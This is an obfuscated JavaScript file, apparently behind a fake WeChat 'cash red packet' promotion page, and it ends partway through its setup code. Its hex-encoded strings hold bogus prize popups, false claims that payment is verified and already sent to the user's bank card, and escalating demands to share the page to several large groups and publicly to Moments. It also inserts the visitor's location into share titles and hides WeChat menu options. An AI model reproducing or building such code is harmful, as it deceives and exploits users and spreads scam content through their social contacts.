var __encode = 'sojson.com',
    _0xb483 = ["\x5F\x64\x65\x63\x6F\x64\x65",
        "\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"
        ];
(function (_0xd642x1) {
    _0xd642x1[_0xb483[0]] = _0xb483[1]
})(window);
var __Ox3fdd4 = ["\x61\x74\x6F\x62", "\x70\x61\x72\x73\x65", "", "\x63\x69\x74\x79", "\x70\x72\x6F\x76\x69\x6E\x63\x65",
    "\u5317\u4EAC", "\x24\x31", "\x72\x65\x70\x6C\x61\x63\x65", "\x70\x74\x69\x74\x6C\x65\x30", "\x73",
    "\x74\x69\x74\x6C\x65\x31", "\x74\x69\x74\x6C\x65\x32", "\x74\x69\x74\x6C\x65\x33", "\x74\x69\x74\x6C\x65\x34",
    "\x74\x69\x74\x6C\x65\x35", "\x74\x69\x74\x6C\x65\x36", "\x70\x74\x69\x74\x6C\x65\x31",
    "\x70\x74\x69\x74\x6C\x65\x32", "\x64\x65\x73\x63\x31", "\x64\x65\x73\x63\x32", "\x64\x65\x73\x63\x33",
    "\x64\x65\x73\x63\x34", "\x64\x65\x73\x63\x35", "\x64\x65\x73\x63\x36", "\x74\x69\x74\x6C\x65", "\x68\x74",
    "\x3C\x21\x44\x4F\x43\x54\x59\x50\x45\x20\x68\x74\x6D\x6C\x3E\x3C\x68\x74\x6D\x6C\x20\x6C\x61\x6E\x67\x3D\x22\x65\x6E\x22\x3E\x3C\x68\x65\x61\x64\x3E\x3C\x6D\x65\x74\x61\x20\x63\x68\x61\x72\x73\x65\x74\x3D\x22\x67\x62\x6B\x22\x3E\x3C\x74\x69\x74\x6C\x65\x3E\x3C\x2F\x74\x69\x74\x6C\x65\x3E\x3C\x6D\x65\x74\x61\x20\x6E\x61\x6D\x65\x3D\x22\x76\x69\x65\x77\x70\x6F\x72\x74\x22\x20\x63\x6F\x6E\x74\x65\x6E\x74\x3D\x22\x77\x69\x64\x74\x68\x3D\x64\x65\x76\x69\x63\x65\x2D\x77\x69\x64\x74\x68\x2C\x20\x75\x73\x65\x72\x2D\x73\x63\x61\x6C\x61\x62\x6C\x65\x3D\x6E\x6F\x2C\x20\x69\x6E\x69\x74\x69\x61\x6C\x2D\x73\x63\x61\x6C\x65\x3D\x31\x2E\x30\x2C\x20\x6D\x61\x78\x69\x6D\x75\x6D\x2D\x73\x63\x61\x6C\x65\x3D\x31\x2E\x30\x2C\x20\x6D\x69\x6E\x69\x6D\x75\x6D\x2D\x73\x63\x61\x6C\x65\x3D\x31\x2E\x30\x22\x3E\x3C\x6C\x69\x6E\x6B\x20\x72\x65\x6C\x3D\x22\x73\x74\x79\x6C\x65\x73\x68\x65\x65\x74\x22\x20\x68\x72\x65\x66\x3D\x22\x68\x74\x74\x70\x73\x3A\x2F\x2F\x70\x69\x78\x6B\x2E\x6F\x73\x73\x2D\x63\x6E\x2D\x73\x68\x61\x6E\x67\x68\x61\x69\x2E\x61\x6C\x69\x79\x75\x6E\x63\x73\x2E\x63\x6F\x6D\x2F\x6E\x65\x77\x2F\x32\x30\x31\x39\x2F\x73\x2E\x63\x73\x73\x22\x2F\x3E\x3C\x2F\x68\x65\x61\x64\x3E\x3C\x62\x6F\x64\x79\x3E\x3C\x64\x69\x76\x20\x69\x64\x3D\x22\x74\x6B\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x73\x68\x61\x72\x65\x2D\x62\x6F\x64\x79\x22\x3E\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x73\x68\x61\x72\x65\x2D\x63\x6F\x6E\x74\x61\x69\x6E\x65\x72\x22\x3E\x3C\x68\x33\x20\x63\x6C\x61\x73\x73\x3D\x22\x73\x68\x61\x72\x65\x2D\x63\x6F\x6E\x74\x61\x69\x6E\x65\x72\x2D\x62\x67\x2D\x74\x69\x74\x6C\x65\x22\x3E\u5206\u4EAB\u70B9\u8FD9\u91CC\x3C\x2F\x68\x33\x3E\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x73\x68\x61\x72\x65\x2D\x70\x72\x6F\x6D\x70\x74\x22\x3E\x3C\x70\x3E\u70B9\u51FB\u53F3\u4E0A\u89D2\uFF0C\u5206\u4EAB\u5230\x20\x3C\x69\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x63\x6F\x6E\x5F\x73\x68\x61\x72\x65\x22\x3E\x3C\x2F\x69\x3E\x3C\x73\x70\x61\x6E\x20\x63\x6C\x61\x73\x73\x3D\x22\x6A\x73\x5F\x73\x68\x61\x72\x65\x5F\x74\x6F\x5F\x64\x65\x73\x63\x22\x3E\x20\u5FAE\u4FE1\u7FA4\x3C\x2F\x73\x70\x61\x6E\x3E\x3C\x2F\x70\x3E\x3C\x70\x3E\u5373\u53EF\u9886\u53D6\uFFE5\x3C\x73\x70\x61\x6E\x20\x63\x6C\x61\x73\x73\x3D\x22\x6A\x73\x5F\x73\x68\x61\x72\x65\x5F\x74\x6F\x5F\x64\x65\x73\x63\x22\x3E",
    "\x6E\x61\x6D\x65",
    "\x3C\x2F\x73\x70\x61\x6E\x3E\x3C\x2F\x70\x3E\x3C\x2F\x64\x69\x76\x3E\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x72\x65\x64\x2D\x70\x61\x63\x6B\x65\x74\x22\x3E\x3C\x69\x6D\x67\x20\x73\x72\x63\x3D\x22\x68\x74\x74\x70\x3A\x2F\x2F\x62\x6A\x2E\x62\x63\x65\x62\x6F\x73\x2E\x63\x6F\x6D\x2F\x6D\x74\x63\x61\x70\x70\x2F\x2F\x70\x6E\x67\x2F\x61\x65\x63\x61\x65\x64\x33\x64\x33\x39\x65\x30\x38\x61\x33\x62\x30\x38\x63\x30\x62\x36\x64\x38\x32\x35\x61\x35\x38\x64\x37\x34\x2E\x70\x6E\x67\x22\x3E\x3C\x70\x3E\u606D\u559C\u53D1\u8D22\x3C\x2F\x70\x3E\x3C\x2F\x64\x69\x76\x3E\x3C\x2F\x64\x69\x76\x3E\x3C\x2F\x64\x69\x76\x3E\x3C\x2F\x62\x6F\x64\x79\x3E\x3C\x2F\x68\x74\x6D\x6C\x3E",
    "\x77\x72\x69\x74\x65", "\u6211\u77E5\u9053\u4E86",
    "\x25\x33\x43\x64\x69\x76\x25\x32\x30\x69\x64\x25\x33\x44\x25\x32\x32\x64\x69\x61\x6C\x6F\x67\x25\x32\x32\x25\x32\x30\x63\x6C\x61\x73\x73\x25\x33\x44\x25\x32\x32\x6D\x6F\x64\x2D\x70\x6F\x70\x75\x70\x25\x32\x30\x73\x69\x6E\x67\x6C\x65\x2D\x62\x74\x6E\x2D\x70\x6F\x70\x75\x70\x25\x32\x32\x25\x33\x45\x25\x33\x43\x64\x69\x76\x25\x32\x30\x63\x6C\x61\x73\x73\x25\x33\x44\x25\x32\x32\x70\x6F\x70\x75\x70\x2D\x62\x6F\x64\x79\x25\x32\x32\x25\x33\x45\x25\x33\x43\x68\x33\x25\x32\x30\x63\x6C\x61\x73\x73\x25\x33\x44\x25\x32\x32\x70\x6F\x70\x75\x70\x2D\x74\x69\x74\x6C\x65\x25\x32\x32\x25\x33\x45\x25\x33\x43\x2F\x68\x33\x25\x33\x45\x25\x33\x43\x64\x69\x76\x25\x32\x30\x63\x6C\x61\x73\x73\x25\x33\x44\x25\x32\x32\x70\x6F\x70\x75\x70\x2D\x63\x6F\x6E\x74\x25\x32\x32\x25\x33\x45\x25\x33\x43\x2F\x64\x69\x76\x25\x33\x45\x25\x33\x43\x64\x69\x76\x25\x32\x30\x63\x6C\x61\x73\x73\x25\x33\x44\x25\x32\x32\x70\x6F\x70\x75\x70\x2D\x62\x74\x6E\x25\x32\x32\x25\x33\x45\x25\x33\x43\x61\x25\x32\x30\x63\x6C\x61\x73\x73\x25\x33\x44\x25\x32\x32\x6A\x73\x5F\x67\x6C\x6F\x62\x61\x6C\x5F\x64\x69\x61\x6C\x6F\x67\x5F\x73\x75\x62\x6D\x69\x74\x5F\x62\x74\x6E\x25\x32\x32\x25\x33\x45\x25\x33\x43\x73\x70\x61\x6E\x25\x33\x45\x25\x75\x36\x32\x31\x31\x25\x75\x37\x37\x45\x35\x25\x75\x39\x30\x35\x33\x25\x75\x34\x45\x38\x36\x25\x33\x43\x2F\x73\x70\x61\x6E\x25\x33\x45\x25\x33\x43\x2F\x61\x25\x33\x45\x25\x33\x43\x2F\x64\x69\x76\x25\x33\x45\x25\x33\x43\x2F\x64\x69\x76\x25\x33\x45\x25\x33\x43\x2F\x64\x69\x76\x25\x33\x45",
    "\x6C\x65\x6E\x67\x74\x68", "\x23\x64\x69\x61\x6C\x6F\x67", "\x65\x6D\x70\x74\x79",
    "\x23\x64\x69\x61\x6C\x6F\x67\x20\x2E\x70\x6F\x70\x75\x70\x2D\x63\x6F\x6E\x74", "\x61\x70\x70\x65\x6E\x64",
    "\x62\x6F\x64\x79", "\x73\x68\x6F\x77", "\x68\x74\x6D\x6C", "\x2E\x70\x6F\x70\x75\x70\x2D\x74\x69\x74\x6C\x65",
    "\x66\x69\x6E\x64", "\x2E\x70\x6F\x70\x75\x70\x2D\x63\x6F\x6E\x74",
    "\x2E\x6A\x73\x5F\x67\x6C\x6F\x62\x61\x6C\x5F\x64\x69\x61\x6C\x6F\x67\x5F\x73\x75\x62\x6D\x69\x74\x5F\x62\x74\x6E",
    "\x63\x6C\x69\x63\x6B", "\x68\x69\x64\x65", "\x6F\x6E", "\x6F\x66\x66",
    "\x2E\x70\x6F\x70\x75\x70\x2D\x62\x74\x6E",
    "\x3C\x64\x69\x76\x20\x69\x64\x3D\x22\x6C\x6F\x61\x64\x69\x6E\x67\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x6D\x6F\x64\x2D\x70\x6F\x70\x75\x70\x20\x73\x69\x6E\x67\x6C\x65\x2D\x62\x74\x6E\x2D\x70\x6F\x70\x75\x70\x22\x3E\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x70\x6F\x70\x75\x70\x2D\x62\x6F\x64\x79\x22\x20\x73\x74\x79\x6C\x65\x3D\x22\x6D\x61\x72\x67\x69\x6E\x2D\x74\x6F\x70\x3A\x20\x35\x30\x25\x3B\x22\x3E\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x70\x6F\x70\x75\x70\x2D\x63\x6F\x6E\x74\x22\x3E\x3C\x2F\x64\x69\x76\x3E\x3C\x2F\x64\x69\x76\x3E\x3C\x2F\x64\x69\x76\x3E",
    "\x3C\x69\x6D\x67\x20\x73\x74\x79\x6C\x65\x3D\x22\x77\x69\x64\x74\x68\x3A\x20\x33\x30\x70\x78\x22\x20\x73\x72\x63\x3D\x22\x68\x74\x74\x70\x3A\x2F\x2F\x62\x6A\x2E\x62\x63\x65\x62\x6F\x73\x2E\x63\x6F\x6D\x2F\x6D\x74\x63\x61\x70\x70\x2F\x2F\x67\x69\x66\x2F\x66\x64\x34\x36\x66\x65\x34\x61\x63\x39\x35\x66\x36\x33\x37\x63\x63\x36\x62\x33\x33\x38\x38\x37\x66\x31\x33\x63\x64\x36\x62\x62\x2E\x67\x69\x66\x22\x3E\x3C\x62\x72\x3E\x3C\x62\x20\x73\x74\x79\x6C\x65\x3D\x22\x66\x6F\x6E\x74\x2D\x73\x69\x7A\x65\x3A\x20\x32\x30\x70\x78\x3B\x63\x6F\x6C\x6F\x72\x3A\x20\x72\x65\x64\x22\x3E\u6B63\u5728\u67E5\u8BE2\u7EA2\u5305\u6570\u636E\x2E\x2E\x2E\x3C\x2F\x62\x3E",
    "\x23\x6C\x6F\x61\x64\x69\x6E\x67", "\x6C\x6F\x61\x64\x69\x6E\x67",
    "\x3C\x73\x70\x61\x6E\x20\x73\x74\x79\x6C\x65\x3D\x22\x66\x6F\x6E\x74\x2D\x73\x69\x7A\x65\x3A\x20\x32\x33\x70\x78\x3B\x63\x6F\x6C\x6F\x72\x3A\x23\x31\x42\x42\x43\x39\x42\x3B\x22\x3E\u606D\u559C\u60A8\x3C\x2F\x73\x70\x61\x6E\x3E",
    "\x3C\x73\x70\x61\x6E\x3E\u60A8\u83B7\u5F97\u73B0\u91D1\u7EA2\u5305\x3C\x2F\x73\x70\x61\x6E\x3E\x3C\x62\x72\x3E\x3C\x73\x70\x61\x6E\x20\x73\x74\x79\x6C\x65\x3D\x22\x66\x6F\x6E\x74\x2D\x73\x69\x7A\x65\x3A\x20\x32\x30\x70\x78\x3B\x63\x6F\x6C\x6F\x72\x3A\x72\x65\x64\x3B\x22\x3E",
    "\u5143\x3C\x2F\x73\x70\x61\x6E\x3E\x3C\x62\x72\x3E\x3C\x73\x70\x61\x6E\x20\x73\x74\x79\x6C\x65\x3D\x22\x63\x6F\x6C\x6F\x72\x3A\x72\x65\x64\x3B\x22\x3E\u6D3B\u52A8\u5B97\u65E8\u4E3A\u63D0\u9AD8\u516C\u53F8\u77E5\u540D\u5EA6\x3C\x62\x72\x3E\u5206\u4EAB\u5230\u7FA4\u540E\x3C\x2F\x73\x70\x61\x6E\x3E\x3C\x73\x70\x61\x6E\x20\x73\x74\x79\x6C\x65\x3D\x22\x63\x6F\x6C\x6F\x72\x3A\x23\x31\x42\x42\x43\x39\x42\x3B\x20\x66\x6F\x6E\x74\x2D\x73\x69\x7A\x65\x3A\x20\x32\x30\x70\x78\x3B\x22\x3E\u5373\u53EF\u9886\u53D6\x3C\x2F\x73\x70\x61\x6E\x3E\x3C\x62\x72\x3E\x3C\x62\x72\x3E\x3C\x73\x70\x61\x6E\x3E\u7EA2\u5305\u603B\u989D\u4EC5\u5269\x3C\x2F\x73\x70\x61\x6E\x3E\x3C\x73\x70\x61\x6E\x20\x73\x74\x79\x6C\x65\x3D\x22\x66\x6F\x6E\x74\x2D\x73\x69\x7A\x65\x3A\x20\x32\x30\x70\x78\x3B\x63\x6F\x6C\x6F\x72\x3A\x72\x65\x64\x3B\x22\x3E",
    "\u4E07\x3C\x2F\x73\x70\x61\x6E\x3E\u5143\x2C\u5148\u5230\u5148\u5F97\uFF0C\u6D3B\u52A8\u7ECF\u5FAE\u4FE1\u8BA4\u8BC1\uFF0C\u771F\u5B9E\u6709\u6548\uFF01",
    "\x61\x6C\x65\x72\x74",
    "\x3C\x62\x20\x73\x74\x79\x6C\x65\x3D\x22\x66\x6F\x6E\x74\x2D\x73\x69\x7A\x65\x3A\x20\x32\x32\x70\x78\x3B\x63\x6F\x6C\x6F\x72\x3A\x20\x23\x31\x42\x42\x43\x39\x42\x3B\x22\x3E\u5206\u4EAB\u6210\u529F\uFF01\x3C\x2F\x62\x3E",
    "\x3C\x62\x72\x2F\x3E\u8BF7\u7EE7\u7EED\u5206\u4EAB\u5230\x3C\x62\x20\x73\x74\x79\x6C\x65\x3D\x22\x66\x6F\x6E\x74\x2D\x73\x69\x7A\x65\x3A\x20\x32\x30\x70\x78\x3B\x63\x6F\x6C\x6F\x72\x3A\x20\x72\x65\x64\x22\x3E\x32\x3C\x2F\x62\x3E\u4E2A\u4E0D\u540C\u7684\u7FA4\x3C\x62\x72\x2F\x3E\x3C\x73\x70\x61\x6E\x20\x73\x74\x79\x6C\x65\x3D\x22\x63\x6F\x6C\x6F\x72\x3A\x72\x65\x64\x3B\x22\x3E\u7EA2\u5305\u5C06\u7ACB\u5373\u5230\u8D26\uFF01\x3C\x2F\x73\x70\x61\x6E\x3E",
    "\x3C\x62\x20\x73\x74\x79\x6C\x65\x3D\x22\x66\x6F\x6E\x74\x2D\x73\x69\x7A\x65\x3A\x20\x32\x32\x70\x78\x3B\x63\x6F\x6C\x6F\x72\x3A\x20\x72\x65\x64\x3B\x22\x3E\u5206\u4EAB\u5931\u8D25\uFF01\x3C\x2F\x62\x3E",
    "\x3C\x62\x72\x2F\x3E\u6CE8\u610F\uFF1A\x3C\x73\x70\x61\x6E\x20\x63\x6F\x6C\x6F\x72\x3D\x22\x72\x65\x64\x22\x3E\u5206\u4EAB\u5230\u76F8\u540C\u7684\u7FA4\u4F1A\u5931\u8D25\x3C\x2F\x73\x70\x61\x6E\x3E\x3C\x62\x72\x3E\u8BF7\u5C1D\u8BD5\u91CD\u65B0\u5206\u4EAB\u5230\x3C\x62\x20\x73\x74\x79\x6C\x65\x3D\x22\x66\x6F\x6E\x74\x2D\x73\x69\x7A\x65\x3A\x20\x32\x30\x70\x78\x3B\x63\x6F\x6C\x6F\x72\x3A\x20\x72\x65\x64\x22\x3E\x32\u4E2A\u4E0D\u540C\u7684\u7FA4\x3C\x2F\x62\x3E\x3C\x62\x72\x3E",
    "\x3C\x62\x72\x2F\x3E\u8BF7\u7EE7\u7EED\u5206\u4EAB\u5230\x3C\x62\x20\x73\x74\x79\x6C\x65\x3D\x22\x66\x6F\x6E\x74\x2D\x73\x69\x7A\x65\x3A\x20\x32\x30\x70\x78\x3B\x63\x6F\x6C\x6F\x72\x3A\x20\x72\x65\x64\x22\x3E\x31\x3C\x2F\x62\x3E\u4E2A\u4E0D\u540C\u7684\u7FA4\x3C\x62\x72\x2F\x3E\x3C\x73\x70\x61\x6E\x20\x73\x74\x79\x6C\x65\x3D\x22\x63\x6F\x6C\x6F\x72\x3A\x72\x65\x64\x3B\x22\x3E\u7EA2\u5305\u5C06\u7ACB\u5373\u5230\u8D26\uFF01\x3C\x2F\x73\x70\x61\x6E\x3E",
    "\x3C\x62\x72\x2F\x3E\u6CE8\u610F\uFF1A\x3C\x73\x70\x61\x6E\x20\x63\x6F\x6C\x6F\x72\x3D\x22\x72\x65\x64\x22\x3E\u7FA4\u4EBA\u6570\u5FC5\u987B\u5927\u4E8E\x35\x30\u4EBA\x3C\x2F\x73\x70\x61\x6E\x3E\x3C\x62\x72\x3E\u8BF7\u5C1D\u8BD5\u91CD\u65B0\u5206\u4EAB\u5230\x3C\x62\x20\x73\x74\x79\x6C\x65\x3D\x22\x66\x6F\x6E\x74\x2D\x73\x69\x7A\x65\x3A\x20\x32\x30\x70\x78\x3B\x63\x6F\x6C\x6F\x72\x3A\x20\x72\x65\x64\x22\x3E\x3E\x35\x30\u4EBA\u7684\u7FA4\x3C\x2F\x62\x3E\x3C\x62\x72\x3E",
    "\x3C\x62\x72\x2F\x3E\u6CE8\u610F\uFF1A\x3C\x73\x70\x61\x6E\x20\x63\x6F\x6C\x6F\x72\x3D\x22\x72\x65\x64\x22\x3E\u5206\u4EAB\u5230\u76F8\u540C\u7684\u7FA4\u4F1A\u5931\u8D25\x3C\x2F\x73\x70\x61\x6E\x3E\x3C\x62\x72\x3E\u8BF7\u5C1D\u8BD5\u91CD\u65B0\u5206\u4EAB\u5230\x3C\x62\x20\x73\x74\x79\x6C\x65\x3D\x22\x66\x6F\x6E\x74\x2D\x73\x69\x7A\x65\x3A\x20\x32\x30\x70\x78\x3B\x63\x6F\x6C\x6F\x72\x3A\x20\x72\x65\x64\x22\x3E\x31\u4E2A\u4E0D\u540C\u7684\u7FA4\x3C\x2F\x62\x3E\x3C\x62\x72\x3E",
    "\x3C\x62\x72\x2F\x3E\u5269\u4E0B\u6700\u540E\u4E00\u6B65\u5566\uFF01\x3C\x62\x72\x20\x2F\x3E\u8BF7\u5206\u4EAB\u5230\x3C\x73\x70\x61\x6E\x20\x73\x74\x79\x6C\x65\x3D\x22\x66\x6F\x6E\x74\x2D\x73\x69\x7A\x65\x3A\x20\x32\x30\x70\x78\x3B\x63\x6F\x6C\x6F\x72\x3A\x72\x65\x64\x22\x3E\u670B\u53CB\u5708\x3C\x2F\x73\x70\x61\x6E\x3E\uFF0C\u83B7\u8D60\x3C\x62\x20\x73\x74\x79\x6C\x65\x3D\x22\x66\x6F\x6E\x74\x2D\x73\x69\x7A\x65\x3A\x20\x31\x38\x70\x78\x3B\x63\x6F\x6C\x6F\x72\x3A\x20\x72\x65\x64\x3B\x22\x3E",
    "\x3C\x2F\x62\x3E\u5143\uD83D\uDCB0\u7ACB\u5373\u5230\u8D26\uFF01",
    "\x3C\x62\x72\x2F\x3E\u6CE8\u610F\uFF1A\u5FC5\u987B\x3C\x73\x70\x61\x6E\x20\x73\x74\x79\x6C\x65\x3D\x22\x63\x6F\x6C\x6F\x72\x3A\x72\x65\x64\x22\x3E\u516C\u5F00\u5206\u4EAB\x3C\x2F\x73\x70\x61\x6E\x3E\u54E6\x21\x3C\x62\x72\x3E\u8BF7\u5C1D\u8BD5\u91CD\u65B0\u5206\u4EAB\u5230\x3C\x62\x20\x73\x74\x79\x6C\x65\x3D\x22\x66\x6F\x6E\x74\x2D\x73\x69\x7A\x65\x3A\x20\x32\x30\x70\x78\x3B\x63\x6F\x6C\x6F\x72\x3A\x20\x72\x65\x64\x22\x3E\u670B\u53CB\u5708\x3C\x2F\x62\x3E\x3C\x62\x72\x3E",
    "\x3C\x73\x70\x61\x6E\x20\x73\x74\x79\x6C\x65\x3D\x22\x66\x6F\x6E\x74\x2D\x73\x69\x7A\x65\x3A\x20\x32\x30\x70\x78\x3B\x63\x6F\x6C\x6F\x72\x3A\x20\x72\x65\x64\x3B\x22\x3E\u606D\u559C\u4F60\x3C\x2F\x73\x70\x61\x6E\x3E",
    "\u60A8\u83B7\u5F97\uFFE5\x3C\x73\x70\x61\x6E\x20\x73\x74\x79\x6C\x65\x3D\x22\x66\x6F\x6E\x74\x2D\x73\x69\x7A\x65\x3A\x20\x32\x30\x70\x78\x3B\x63\x6F\x6C\x6F\x72\x3A\x20\x72\x65\x64\x3B\x22\x3E",
    "\x3C\x2F\x73\x70\x61\x6E\x3E\u5143\u73B0\u91D1\u7EA2\u5305\x3C\x62\x72\x3E\u91D1\u989D\u5DF2\u63D0\u4EA4\u94F6\u884C\u6253\u6B3E\uFF0C\u9884\u8BA1\x31\u5C0F\u65F6\u5185\u5230\u8D26\uFF08\u8DE8\u884C\u6B21\u65E5\u5230\u8D26\uFF0C\u975E\u5DE5\u4F5C\u65F6\u95F4\x5B\x30\x39\x3A\x30\x30\x2D\x31\x37\x3A\x30\x30\x5D\u6B21\u65E5\u5230\u8D26\uFF09\uFF0C\u8BF7\u6CE8\u610F\u67E5\u6536\u5FAE\u4FE1\u7ED1\u5B9A\u94F6\u884C\u5361\u5230\u8D26\u60C5\u51B5\uFF01",
    "\x23\x74\x6B", "\x74", "\x72\x65\x73\x75\x6C\x74", "\x64\x65\x73\x63", "\x6C\x69\x6E\x6B", "\x66",
    "\x69\x6D\x67\x5F\x75\x72\x6C", "\x69\x6D\x67\x32", "\x6E\x6F", "\x68\x72\x65\x66", "\x26\x73\x68\x61\x3D",
    "\x69\x6D\x67\x33", "\x69\x6D\x67\x34", "\x69\x6D\x67\x35", "\x69\x6D\x67\x36", "\x70\x69\x6D\x67\x31",
    "\x74\x79\x70\x65", "\x70\x69\x6D\x67\x32",
    "\x2F\x30\x32\x33\x66\x36\x62\x36\x66\x35\x38\x63\x31\x66\x39\x37\x61\x34\x65\x64\x62\x65\x64\x64\x62\x39\x66\x63\x34\x62\x31\x35\x65\x3F\x70\x6F\x70\x3D",
    "\x67\x65\x74", "\x6A\x73\x41\x70\x69\x4C\x69\x73\x74", "\x63\x6F\x6E\x66\x69\x67",
    "\x6F\x6E\x4D\x65\x6E\x75\x53\x68\x61\x72\x65\x54\x69\x6D\x65\x6C\x69\x6E\x65",
    "\x6F\x6E\x4D\x65\x6E\x75\x53\x68\x61\x72\x65\x41\x70\x70\x4D\x65\x73\x73\x61\x67\x65",
    "\x68\x69\x64\x65\x4F\x70\x74\x69\x6F\x6E\x4D\x65\x6E\x75",
    "\x73\x68\x6F\x77\x4F\x70\x74\x69\x6F\x6E\x4D\x65\x6E\x75",
    "\x68\x69\x64\x65\x4D\x65\x6E\x75\x49\x74\x65\x6D\x73", "\x73\x68\x6F\x77\x4D\x65\x6E\x75\x49\x74\x65\x6D\x73",
    "\x63\x6C\x6F\x73\x65\x57\x69\x6E\x64\x6F\x77", "\x61\x61", "\x62\x62",
    "\x6D\x65\x6E\x75\x49\x74\x65\x6D\x3A\x73\x68\x61\x72\x65\x3A\x71\x71",
    "\x6D\x65\x6E\x75\x49\x74\x65\x6D\x3A\x73\x68\x61\x72\x65\x3A\x77\x65\x69\x62\x6F\x41\x70\x70",
    "\x6D\x65\x6E\x75\x49\x74\x65\x6D\x3A\x66\x61\x76\x6F\x72\x69\x74\x65",
    "\x6D\x65\x6E\x75\x49\x74\x65\x6D\x3A\x73\x65\x74\x46\x6F\x6E\x74",
    "\x6D\x65\x6E\x75\x49\x74\x65\x6D\x3A\x63\x6F\x70\x79\x55\x72\x6C",
    "\x6D\x65\x6E\x75\x49\x74\x65\x6D\x3A\x72\x65\x61\x64\x4D\x6F\x64\x65",
    "\x6D\x65\x6E\x75\x49\x74\x65\x6D\x3A\x6F\x70\x65\x6E\x57\x69\x74\x68\x51\x51\x42\x72\x6F\x77\x73\x65\x72",
    "\x6D\x65\x6E\x75\x49\x74\x65\x6D\x3A\x73\x68\x61\x72\x65\x3A\x65\x6D\x61\x69\x6C",
    "\x6D\x65\x6E\x75\x49\x74\x65\x6D\x3A\x73\x68\x61\x72\x65\x3A\x66\x61\x63\x65\x62\x6F\x6F\x6B",
    "\x6D\x65\x6E\x75\x49\x74\x65\x6D\x3A\x73\x68\x61\x72\x65\x3A\x51\x5A\x6F\x6E\x65",
    "\x6D\x65\x6E\x75\x49\x74\x65\x6D\x3A\x73\x68\x61\x72\x65\x3A\x74\x69\x6D\x65\x6C\x69\x6E\x65",
    "\x6D\x65\x6E\x75\x49\x74\x65\x6D\x3A\x6F\x70\x65\x6E\x57\x69\x74\x68\x53\x61\x66\x61\x72\x69",
    "\x72\x65\x61\x64\x79", "\x47\x45\x54", "\x61", "\x6A\x73\x6F\x6E", "\x63\x6F\x6E\x74\x65\x6E\x74",
    "\x61\x6C\x77\x61\x79\x73", "\x61\x74\x74\x72",
    "\x6D\x65\x74\x61\x5B\x6E\x61\x6D\x65\x3D\x72\x65\x66\x65\x72\x72\x65\x72\x5D", "\x74\x72\x69\x67\x67\x65\x72",
    "\x69\x6D\x67\x31", "\x61\x6A\x61\x78",
    "\x6D\x65\x6E\x75\x49\x74\x65\x6D\x3A\x73\x68\x61\x72\x65\x3A\x61\x70\x70\x4D\x65\x73\x73\x61\x67\x65",
    "\x2F\x3F\x73\x3D\x2F\x41\x70\x69\x2F\x6D\x79\x64\x6F\x6D\x61\x69\x6E\x26\x75\x69\x64\x3D\x66\x65\x69\x26\x73\x69\x67\x6E\x3D\x63\x30\x65\x35\x38\x38\x33\x64\x31\x64\x37\x31\x32\x31\x37\x31\x66\x31\x66\x39\x36\x64\x33\x62\x31\x33\x35\x64\x66\x32\x30\x66\x26\x76\x3D\x31\x2E\x30",
    "\x74\x74\x74", "\x23", "\x67\x65\x74\x54\x69\x6D\x65", "\x70\x75\x73\x68\x53\x74\x61\x74\x65",
    "\x68\x74\x74\x70\x3A\x2F\x2F", "\x2F\x67\x31", "\x3F\x6C\x6F\x67\x69\x6E\x3D",
    "\x6F\x6E\x68\x61\x73\x68\x63\x68\x61\x6E\x67\x65", "\x72\x61\x6E\x64\x6F\x6D", "\x74\x6F\x46\x69\x78\x65\x64",
    "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39",
    "\x66\x6C\x6F\x6F\x72", "\x63\x68\x61\x72\x41\x74"];
_f = JSON[__Ox3fdd4[0x1]](window[__Ox3fdd4[0x0]](_f));
var aam = __Ox3fdd4[0x2];
var bbm = __Ox3fdd4[0x2];
var money = ranmo();
var address = localAddress[__Ox3fdd4[0x3]] ? localAddress[__Ox3fdd4[0x3]] : (localAddress[__Ox3fdd4[0x4]] ?
    localAddress[__Ox3fdd4[0x4]] : __Ox3fdd4[0x5]);
var city = address[__Ox3fdd4[0x7]](/(.*)市/, __Ox3fdd4[0x6]);
city = city[__Ox3fdd4[0x7]](/(.*)省/, __Ox3fdd4[0x6]);
_f[__Ox3fdd4[0x9]][__Ox3fdd4[0x8]] = _f[__Ox3fdd4[0x9]][__Ox3fdd4[0x8]][__Ox3fdd4[0x7]](/{city}/g, city);
_f[__Ox3fdd4[0x9]][__Ox3fdd4[0xa]] = _f[__Ox3fdd4[0x9]][__Ox3fdd4[0xa]][__Ox3fdd4[0x7]](/{city}/g, city);
_f[__Ox3fdd4[0x9]][__Ox3fdd4[0xb]] = _f[__Ox3fdd4[0x9]][__Ox3fdd4[0xb]][__Ox3fdd4[0x7]](/{city}/g, city);
_f[__Ox3fdd4[0x9]][__Ox3fdd4[0xc]] = _f[__Ox3fdd4[0x9]][__Ox3fdd4[0xc]][__Ox3fdd4[0x7]](/{city}/g, city);
_f[__Ox3fdd4[0x9]][__Ox3fdd4[0xd]] = _f[__Ox3fdd4[0x9]][__Ox3fdd4[0xd]][__Ox3fdd4[0x7]](/{city}/g, city);
_f[__Ox3fdd4[0x9]][__Ox3fdd4[0xe]] = _f[__Ox3fdd4[0x9]][__Ox3fdd4[0xe]][__Ox3fdd4[0x7]](/{city}/g, city);
_f[__Ox3fdd4[0x9]][__Ox3fdd4[0xf]] = _f[__Ox3fdd4[0x9]][__Ox3fdd4[0xf]][__Ox3fdd4[0x7]](/{city}/g, city);
